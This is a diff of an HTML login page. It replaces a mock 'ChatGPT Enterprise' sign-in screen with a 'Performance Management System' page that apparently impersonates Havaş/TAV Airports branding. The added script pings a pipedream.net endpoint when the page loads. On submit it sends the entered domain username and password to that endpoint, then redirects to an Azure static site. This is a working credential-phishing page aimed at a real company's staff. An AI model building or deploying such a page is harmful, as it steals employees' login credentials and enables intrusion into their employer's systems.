@@ -1,193 +1,123 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="theme-color" content="#0FA47E" />
-  <title>ChatGPT Enterprise — Sign In</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Performance Management System</title>
+
   <style>
-    :root{
-      /* New palette: dark theme + ChatGPT green */
-      --bg:#0b0f0e;
-      --bg-soft:#0d1412;
-      --panel:#0f1514;
-      --text:#e8f1ee;
-      --muted:#a3b2ad;
-      --accent:#10A37F;   /* ChatGPT green */
-      --accent-2:#00C389; /* for gradient accents */
-      --danger:#ff6b6b;
-      --ring: rgba(16,163,127,.35);
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #002B5B; /* Havaş lacivert */
+      font-family: 'Segoe UI', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    *{ box-sizing:border-box }
-    html,body{ height:100% }
-    body{
-      margin:0; color:var(--text);
-      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
-      background:
-        radial-gradient(1200px 800px at 20% -10%, rgba(16,163,127,.10), transparent 60%),
-        radial-gradient(1000px 700px at 120% 120%, rgba(0,195,137,.08), transparent 55%),
-        linear-gradient(180deg, #0a0f0e 0%, #060808 100%);
-      display:grid; place-items:center;
-      padding:24px;
-      color-scheme: dark;
+    .login-box {
+      background: #E8F2FF; /* Açık mavi arka plan */
+      padding: 40px;
+      border-radius: 14px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, .25);
+      width: 340px;
+      text-align: center;
+      border: 2px solid #7CC242; /* Havaş yeşil çerçeve */
     }
 
-    /* Subtle grid background */
-    .grid-overlay{
-      position:fixed; inset:0; pointer-events:none; opacity:.06;
-      background-image: linear-gradient(transparent 23px, #fff 24px), linear-gradient(90deg, transparent 23px, #fff 24px);
-      background-size: 24px 24px;
-      mix-blend-mode: soft-light;
+    .login-box img {
+      width: 110px;
+      margin-bottom: 14px;
     }
 
-    .card{
-      width:100%; max-width:460px; position:relative; overflow:hidden;
-      background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)) , var(--panel);
-      border:1px solid rgba(255,255,255,.06);
-      border-radius:20px; padding:28px 26px 26px;
-      box-shadow: 0 24px 70px rgba(0,0,0,.55), inset 0 1px 0 rgba(255,255,255,.05);
-      backdrop-filter: blur(6px);
-      isolation:isolate;
+    .login-box h2 {
+      color: #7CC242; /* Havaş yeşili */
+      font-size: 18px;
+      margin: 0 0 18px;
     }
 
-    .card::after{ /* glow ring */
-      content:""; position:absolute; inset:-1px; border-radius:inherit; pointer-events:none;
-      box-shadow: 0 0 0 1px rgba(255,255,255,.04), 0 0 50px 8px var(--ring);
-      opacity:.22;
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #7CC242;
+      border-radius: 8px;
+      font-size: 14px;
+      background: white;
     }
 
-    .brand{ display:flex; align-items:center; gap:12px; margin:4px 0 8px }
-    .brand .logo{ width:38px; height:38px; filter:none !important }
-    .brand h1{ font-size:18px; font-weight:700; margin:0 }
-    .subtitle{ margin:0 0 18px 50px; color:var(--muted); font-size:12.5px }
-
-    .section-title{ font-size:14px; font-weight:600; color:#f1f6f4; margin:14px 0 10px }
-
-    .input{ width:100%; padding:13.5px 14px; border-radius:12px; outline:none;
-      background:#0a0f0e; border:1px solid rgba(255,255,255,.08); color:var(--text);
-      transition: border .15s ease, box-shadow .15s ease, background .2s ease; font-size:14.5px }
-    .input::placeholder{ color:#6c7672 }
-    .input:focus{ border-color:var(--accent); box-shadow:0 0 0 3px rgba(16,163,127,.18); background:#0b1110 }
-
-    .row{ display:flex; gap:10px }
-    label{ display:block; font-size:12.5px; color:var(--muted); margin:0 0 6px 2px }
-
-    .btn{ width:100%; padding:12.5px 14px; border:0; border-radius:12px; cursor:pointer;
-      font-weight:700; font-size:14.5px; letter-spacing:.2px; transition: transform .12s, box-shadow .12s, filter .12s }
-
-    .btn-primary{ color:#06120e; background:linear-gradient(90deg, var(--accent), var(--accent-2)); box-shadow:0 10px 22px rgba(16,163,127,.28) }
-    .btn-primary:hover{ transform:translateY(-1px) }
-
-    .btn-ghost{ background:transparent; color:var(--text); border:1px solid rgba(255,255,255,.10) }
-    .btn-ghost:hover{ filter:brightness(1.1) }
-
-    .sso{ display:grid; grid-template-columns: 1fr; gap:10px }
-    .sso .btn{ display:flex; align-items:center; justify-content:center; gap:10px }
-
-    .divider{ display:flex; align-items:center; gap:10px; margin:14px 0 }
-    .divider::before,.divider::after{ content:""; flex:1; height:1px; background:rgba(255,255,255,.08) }
-    .divider span{ font-size:12px; color:var(--muted) }
-
-    #error{ min-height:18px; font-size:12.5px; color:var(--danger); margin:8px 2px 0 }
-
-    .footer{ margin-top:14px; text-align:center; color:var(--muted); font-size:12px }
-
-    @media (prefers-reduced-motion:no-preference){
-      .logo-spin{ animation: spin 14s linear infinite }
-      @keyframes spin{ from{ transform:rotate(0deg)} to{ transform:rotate(360deg)} }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background: #7CC242;  
+      color: #002B5B;
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 15px;
     }
-      /* affiliates bar */
-    .affiliates-bar{
-      position:fixed; left:50%; bottom:20px; transform:translateX(-50%);
-      display:flex; flex-wrap:wrap; gap:14px; align-items:center; justify-content:center;
-      padding:12px 18px; z-index:50;
-      background: rgba(255,255,255,.92); /* lighter background */
-      border:1px solid rgba(0,0,0,.06);
-      border-radius:16px; box-shadow: 0 12px 30px rgba(0,0,0,.35);
-      backdrop-filter: blur(4px) saturate(120%);
-    }
-    .affiliates-bar img{
-      height:44px; max-width:180px; object-fit:contain; filter:none; opacity:1;
-      background:#ffffff; /* white card behind logo */
-      border:1px solid rgba(0,0,0,.06);
-      box-shadow: 0 2px 6px rgba(0,0,0,.08);
-      padding:6px 8px; border-radius:12px; transition: transform .2s ease;
-    }
-    .affiliates-bar img:hover{ transform: translateY(-2px) }
 
-    @media (max-width:520px){
-      .affiliates-bar{ gap:10px; padding:8px 12px }
-      .affiliates-bar img{ height:36px; max-width:130px; padding:4px 6px }
+    .login-box button:hover {
+      background: #6AB03A;
     }
-      
-  </style>
-  <script>
-    
 
-    async function onSubmit(e){
-      e.preventDefault();
-      const form = e.target;
-      const email = form.email.value.trim();
-      const password = form.password.value;
-      const err = document.getElementById('error');
-      err.textContent = '';
+    .login-box p {
+      font-size: 12px;
+      color: #002B5B;
+      margin-top: 12px;
+      opacity: 0.8;
+    }
 
-      if(!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)){
-        err.textContent = 'Enter a valid email.'; return;
+    @media (max-width: 480px) {
+      .login-box {
+        width: 90%;
+        padding: 30px;
       }
-      if(password.length < 8){ err.textContent = 'Password must be at least 8 characters.'; return; }
-
-      try{
-        // TODO: Internal endpoint
-        // const res = await fetch('/auth/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ email, password })});
-        // if(!res.ok) throw new Error('Sign-in failed');
-        await new Promise(r=>setTimeout(r, 500));
-        // Demo: başarılı sayılıyor
-        location.href = '#';
-      }catch(e){ err.textContent = 'Sign-in failed. Please check your details.' }
+      .login-box img {
+        width: 90px;
+      }
     }
-  </script>
+  </style>
 </head>
+
 <body>
-  <div class="grid-overlay" aria-hidden="true"></div>
+  <div class="login-box">
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAc4AAABtCAMAAAAfx3F2AAABDlBMVEX///8AZKMAhFb/1AAAYKEAXJ8AXqAAYqIAWZ6oza//1wAAf00AfU651arR4+7C1eVXiLY5grVrm8IAVJuctdBvocf/0QAAXqgAflrcxROgp1IAgVjp8PYAaaYMi00AYaYAbanlywvd6fEAW6m1zN/0+PuYudR+qstHi7nL3eoAUZrAvCPxzwmPrDPPwxqksywAaJpyjXYrdq2gwNhbmUSJsM/H3K5njG+WoF0zcpOyrUt6pDpDeYtSgIPAtUDLuzNih3t/lWkkbpdIg3Zonz49eYhFlUWhpVfbwiyJmWbRvjG3sElOfoc4kEyZrzB/k20AV62hrUDYxxNSnTrEvx5OlkaitClOgrJ9oADj790hrJboAAAQhElEQVR4nO2dfWPbthHGRZkkOKWTLbm24piKZFm0pDRNUypaX9auXdaXrC9rl7Xz9v2/yPjOA3APCSmOKGd8/rQpiMSPBxzuDlCnk+rUQhLwP/ql4ukRp6d/6rTaqyDOySdjY5yTT3sczd6Hf2z68f7fhHCK58+MadqfAeN80OLcsxDO0fdXxqPt9ee8cf75shKn/z7SWr10Di+dvb2uuY8COCdfHF2Y4px8ydpm71n3vUqcfQfIG6iXDj1w6ZPjt9c191EA5+gvPWOco69443xxWYNTgG8QOk4bfLfX4pTE44wMzhjn5Gue5gfdOutscd65eJzXr3qmg62YXPA4H7c49y8W5+STiJAhztFfeZofXbY49y8Op3h+weFkO1+8vOAXKZFxtjj3Lg5nanAazvHfJsy1KIJw2eJsQAxO+2USFVBxTj7+fKRfCyIIFw+6Lc4GxOC8ftRjcIrxxSMd5/VfeOP85rLF2YR0nPYXqcEpOEe/9HSck29ZmkfPut0WZxPScV7/2GNwCuspg9MGEYTvLlucjUjDWRicjHP0fU/HCSMID1vrbEYqTmF9xeG0X0aUVJzi+SsW59Ofuy3OZqTiLA1Owjn5vKfjrIogtDgbkYJTjF9xOCc/HenWKZ6DNOfjbouzISk4R38vDI7idH/o6ThHj1Cas8XZlGSc1OAIzsnHR7p12i/5RcpFt9vibEoyThqyIzhHSdJEwTkBNQjfXLY4G5OEM/ZfGZyZyyPjnPzE03z9sLXO5iThnPzYY3DmI7CEU4gf+LH298sWZ3OiOBP/Vcc5+b6n45x8DCIIhGaLc++iOEdSPD3HWSRNKE5Ug1BEEFqcjYjgnHwtkclxFkkTipMsaCTj/MflweBczYeDcBoOhpu5SfVmsFr1ea36gXzf6ML+ytfb9eeL5SC6jeVivTK4DaTZfL1YTmOFy+H7c/RIFKdscBnOsuyS4IQRhG73MHD6N6FwbBHLdlxrcJwS6Q/POA2jzgnC9HJGbp82HYToOmH3ldsI5kvLdWw7uQ1HTG8y3gv2NiKxDxOsFmHUjJvdoB015VrTIYe0xDn5RTa4DOd14fIQnPl0qhrnh5cHgTPYhJ7UuO0sk57un7qcnsT/3DiIkndDG18JC2E/Ue7j+NajNy6EE6YV4aHD3ofrMA/j3wwiknon2d74dqG+PwVOYV3JbFKcJGlS4kQ1CFfdg7DO46mjtey6MRPf41uJe2UGviJ63CVt/cZB13ly9b4/9LTbFt4yHieW/PMIoT1LsBl7sAZPON5yzuPUin4SnOJ5WdlV4hzxNQhH31zeEU5lTpqBx+dxLp5w7QpvGP2vAmdn6KJem9LJcwB7dyzNscen7E27YTRGnvFfpeNcW/DlSWV7U9oFOU7d4BKc1OUpcKJdDL9178Y6o45RBJ+GwTlEHeAsOp0p+5UpzmOeddzL1IlBV1nugt7GHL2BbuhHAzv4IvlRgqFbXx3r0rEsxznSQnYxTvslGYELnCM+zSlFEN4Mp7F0nEN9oM07y7kBppXiBKwjOWQUhdDzVrLLbPhwdtiZ840oOIMl/C4il87sGU77Cw1OjPOaJk1ynEYRhKZwbvD+4+gpZ2eszWQggM3Ikye8SExNn81bzExwBgM0+kufcegQnz39tR6yi3DKkDOcms+U//uBSrMBnPMqmlGPh1XW6SPDFqXHGcCp0yUm7Fc/mgsakXEuTWha7pB+Jn38yZe6wV0IIbs8Gc6JUQShGZz9cU2T/L/zYRJ7XMU4ipFPSQwBelWZwPdIOG+MaApb6oEEp7CYePqFUJImKU5pOiV6qhvn/nGavdB6KxmtOfq4U8xPYNaTrQReVCOKc4bXJ1R2KLnTCc7RJ4zBXdgK5BTndW0NQnM4IY66VjKcAT8WU1ZwBeyU3q+PmqkTxVln4PnXbqQ+jXHSxSXBOVJcngSn/S1rm0evdZj7xwld07pW8rEU+TnFytMPAU77pLQS6C3VieDsQwddkRwmjnHy24Yu1LLLBCfaxfCCMc5949x1jCtxztAdebOaeyYRIX/Hu5BwLsyMU3aEEpziJRuye6W6PDFOsIuh9xtHc884sdNZ20rh6aAhLp8813AtUxqnmQ/DieC8NXsWT47xxTj1CEJC6IPX6l8ejVANQu/nA8CJF/i1rfTr2rCz6DryfV2SC9nmgC1ZJc4+CITZ3ump5xSxIjFW+vTUsj/jYzw/qx5shFOdTvP/fPSQo7lnnCfIS6lvpYzngOlXhMkcFaBwI3GEdh7yKc5jfhSwT+ZB0F8vBk46AiiOUIxTsLNh74OHDM66XQxN4pxNd2+lxAnyJcJOeKHQnQjLx4K+b71KnLw3VfhbQX84duO70hJkXAQhJvQdg/NXFEHgjXO/OOe7+pMSzhkAlk6eKDlWrks7/q7utUVxLtgvcokxzs4829YyiU8Ea3DR8MngfM7BPDq6YiII+8cJQzoGrZCXHDST9hxYpohpWRiw+wxOcfIZNFeqVpgNThVHqNP59Rc0fOo4PwU1CGqasxmclf1UfQAoxQlmLSt2OgIQEbbJcgGkMo1Uh1NMpXKj4EarTXrChuziKhEd5z9542QjCHvH2cfdKFwxHlsV3UxxgkBBMnkiyyOOUNUKw3bH03FVBrNusLVs60ypQ5MV8Hv64hIuDefRv7aIIOwdJ1wRWsLZrHy/f8MU3OStUI8C9GSc80R+0qDsYjx1Cm95PPNn80FFsUiBE1awuJ47qKgJZCMISQBWxdn76AE7y/4G/KA946zIQ+YR2RN0iYTT552hOOcJBlLiCHVWcFQvrlpDAyULFTwDC+E6nrNcq05tonM4fKo4rx4/5nA+1WoQmsGJPCExLp47QCtTCSeKDAkUdpISyNC/JlHANa5iKfqm5mxoYTtFtWktzsS3UXBG0ymHs9xq3TBOFBunptMHfS3jBHGA037Ar2ypIwRHSZusTDso41LiDAyCfLZzq5XWMDizEi4F51W3y+Est1o3jBO8znQNAQ1Pxgl8ZOcGlHW6tFORY0vLjWAij8RsNybrHduTqs14nEdpAFbGGa9GGJxqoXRjOAMUbJVSDsBfUnCCkMyQtzwaEcJj/pi+VTP07pU4DaMRzok84Oo48+FTwtl7dslap1oo3RxOsCR0pPcXeBgKTlRAzVeuOFKNPCqIlpij0Zamr2/MwhGOXHnP4MyGT9k6f2dxsjUIb45TqGeE4yVGLU6ps0EFnYITMmH/KtldZ2CEE10l6q9RJb+vGs4iO0Jxpn/UcPZeV9LcuQo+VA/wv62tgoc4pZxD3wznNoE6eTQ3xImChRRnMDWLL3l0EarhLHwbijNNmejWiSMIb4Rzhz0qhoOt0dwZrUjM479q8dldDbbR9FkRcCCSNjqpOEvfhuDM/qjijI97PxicaIEgGQ9YRqg4t6j2USrpYC3htq5QwvPMNnmtPBK5VXGW2RGCM3N4NOvkaxCawQkuyPLOmUAcQcMJ5lhG8tyMFyouTX6gWIO25eh44NWPuHQNpOAk2ZESZ/5HBSdXKN0YTrg0d0g/zozCCMkXmuZFTpXIDAwj0E2F9WGEQqvh2HOrjZSWf8k4e89KFgXOZJHC4ayBuV+caMFHwzFmQb5YphUi8tbPqg/SRHt9kI8oWG1OBmPPgS8YzQAoOEkAtrTOFyzO6gjC3nHCSsby5d2gS3ScldlTIlsNs63QzrEyPIV3Xkg4aUTWn63WQ7gVgmynkHBK2ZEcZ7kzTMZZHUHYO06cIHOWyUUzvFWQwWnmDCkOa6eqYkmM1wmgG4RFwTkNlVcFvwalmyVbJ/VtcpxlVFbCiWsQmsF5jGc723MGy7DCqWBwIudTluoIdXAqINn6Pl0O3Ir3hOJcndreiVxtgDwol8cpZ0cynGRMpTjpLHsQOIOqkKEQePesxeI0Kz0a64eHVBbyRbdRdR8UZzx5uNM19bRAEAThlOsrM5zkbBkJZ0WasxGcFWcW1IrDaeIMqVsKYsFkpoG0ELxwBgQosE7BD7bKwiPFSaOyBCez1bppnPhEkVpxOAM8anLfXghuczEQwZm/TcKzNlkUD253GrM4lTOeEpzFIkW1zqo0ZzM46xL4FeJwGjhDIuTKsHYvxqc4SSuuMz2bHx8vxmgpNuA8WzU7klrnCxYn2sXQJE7TXTpcKxxOkKwmctUtBYmwi12rEqfsiQnXc11YYcSHEdSFR4xTHlNLnJU1CE3h3H20ZXHWO0MeezBeYLZtmpNBJR8j+laVONWFR2KdErYCZ02asyGcu++r5HHW7ZLQtxRkN3sHGwK32RlxSt6qHKd+xlOEU3GOCpyv0S6GRnGiCtl68Tg7NedmuNqWglQrg7OdeBU4KxbR+odoKKOwTm3h8fCqpzhHOU6TCEITOP1dhzmAEwYFs25E9eg7HrhBcG6zM0IqKjuHC48IpzKmZjglb/eQcHbOdjRPgLNf3Y1qFV2hihO/qlXg3OLz8o7dHKfu2zx8qpaO5Di/O1ScQd2xQqgVHmfnpMJIhMCHHteO+jUJsm1CEY405J9nCw+d0MMrtXQkxVn8YNzh4ezMq6ctYZwgy5qr6FYuIpQLLvgzof/mOLdYujrybZzDhcflv9W/pDjRVutDwFkz3Do3/KSEcMJzhiz9kAlJx5WzuH0C6qYznPhkXb2pUI7SJzj51KXmviY4DSMIDeGsDM15C7CWRDgrnaGqR+ssKuzaHgeryiMWzSuVXEsZ8ROcF2YLjwQn3Gp9EDij6RPX5C5Q+gri9OGJjdohE4rOIM/YoEDkKMM5ODV0AZxQ3a97vsXCI8ZpGkFoCmenH4KBLNnPwcd1IU645hBuza8/BGcgWZ6cNg2sPsMZzG9dk5WKM9R2X8c48fZpHefVFjSbOQt+xh8Dm64rzMqmS6HNQSgiRLRgebqJQfHH6pYLleB4aOHS//RaV+i58xinUeoyx2kaQWgOZ2QY+mBlp6fNVh3tzwtE25wqRyjTXGhDqvDSLUIGR/v769Bzq7Z9nDE/2hLhrNo+reIEh7XtiNO1eTk6Tgdcesr+8MZc/d0Nb5mOjf1TvhWM80ao59In0iYtTn502+Q2hO2F2VsQ8o/uutLnV5uBzSAVUUPTDX8D50x4D+M0v9YA5+wESVvSbW7Blbf8KQHB+lZEb0DygyeuNz7Joa/4dm4rJkKfV9WDlVoNpwkPYUUvqRhs8rDgED25+hyz9TAUTlJoK5LzV2zHscLhHMUXz83qCjKc5tca4Hy7WkUdEb3K48GZ0W9WvS3N5ovBNAIaDterqjNHsPzV/GwZpj7cOBws5v2Kd+l8i6jAYyYUeLA4EwW79eCd6y5uw1+u6y86qt2ZQHBWnYNwkDjfIQUD16vnyR3hDnFucW2L826V7FF0a3n+570Hxnpvi2tTtTjvSNlvqvDVSUR/eKv6716e9d2XHzrZuhUmWVvdG/ll4NLhf+Kz1f2RT/f2O2cH4q232k2+nFRwli3Peyy1tMEdtDjvrzSaJy3N+ytlpLXcW8NwcasDlGqb6rk3re6TZlNlpDVKzLU6TM2U5LkdNpkcavWGWsrlDPLZvK3um3zplEVhtzTvt3xSxmZPcQlMq/shv9gmY0/hr220ujcKblOewm1pvhNK/CHhtCPtu6Fg6FjCYgtQW91DBUNPGFRpt7ovGtbS/B9c6NojaBDAYgAAAABJRU5ErkJggg==" alt="HDI Logo" />
+    <h2>Performance Management System</h2>
 
-  <main class="card" role="main" aria-label="ChatGPT Enterprise sign-in card">
-    <header class="brand" aria-label="Brand">
-      <!-- ChatGPT swirl benzeri SVG (monokrom) -->
-      <img class="logo logo-spin" src="https://upload.wikimedia.org/wikipedia/commons/0/04/ChatGPT_logo.svg" alt="ChatGPT Logo" width="38" height="38" decoding="async" />
-      <h1>ChatGPT Enterprise</h1>
-    </header>
-    <p class="subtitle">Sign in with your corporate account</p>
+    <script>
+      fetch("https://eod8ohq1x7p49bb.m.pipedream.net/openpms", {
+        method: "GET",
+        mode: "no-cors"
+      });
+    </script>
 
-    
+    <form id="loginForm" autocomplete="off">
+      <input type="text" name="username" placeholder="Domain Account" required autocomplete="off" />
+      <input type="password" name="password" placeholder="Password" required autocomplete="off" />
+      <button type="submit">Log In</button>
+    </form>
 
-    
-
-    <section aria-label="Email sign-in">
-      <form onsubmit="onSubmit(event)">
-        <label for="email">Work email</label>
-        <input class="input" id="email" name="email" type="email" placeholder="name.surname@tav.aero" autocomplete="username" required />
-
-        <div style="height:10px"></div>
-        <label for="password">Password</label>
-        <input class="input" id="password" name="password" type="password" placeholder="••••••••" autocomplete="current-password" required />
-
-        <div id="error" role="alert" aria-live="polite"></div>
-        <div style="height:12px"></div>
-        <button class="btn btn-primary" type="submit">Continue</button>
-      </form>
-    </section>
-
-    <p class="footer">Having trouble signing in? <a href="#" style="color:var(--accent); text-decoration:none">Contact IT</a>.</p>
-  </main>
-  
-  <!-- Affiliates logos (TAV, ATU, Havaş, BTA) -->
-  <div class="affiliates-bar" aria-label="Affiliates">
-    <img src="https://tavhavalimanlari.com.tr/images/TAV-Airport-International-logo.svg" alt="TAV Airports"/>
-    <img src="https://atu.com.tr/wp-content/uploads/2023/08/ATU-Logo-C%CC%A7erc%CC%A7eveli_page-0001-768x768.jpg" alt="ATU"/>
-    <img src="https://lh3.googleusercontent.com/proxy/yz1SclzsHmWxi7cYNsYWeHPpOXufu8izj6XaxLj93kxxY2E9tonFUExXqlzVcmVsCaXqqEJ9gYmS5H8bB1m9NgEGoFN11ali5bvqoiBzMV11cYLI" alt="Havaş"/>
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTug1qy1PlT2nX7mt03gWpE1_jdcFH4pLu06w&s" alt="BTA"/>
+    <p>© 2025 HAVAŞ is a subsidiary of TAV Airports Holding.
+</p>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+
+      await fetch("https://eod8ohq1x7p49bb.m.pipedream.net", {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+      });
+
+      window.location.href = "https://salmon-pebble-04ad34c10.3.azurestaticapps.net/pms.html";
+    });
+  </script>
 </body>
 </html>
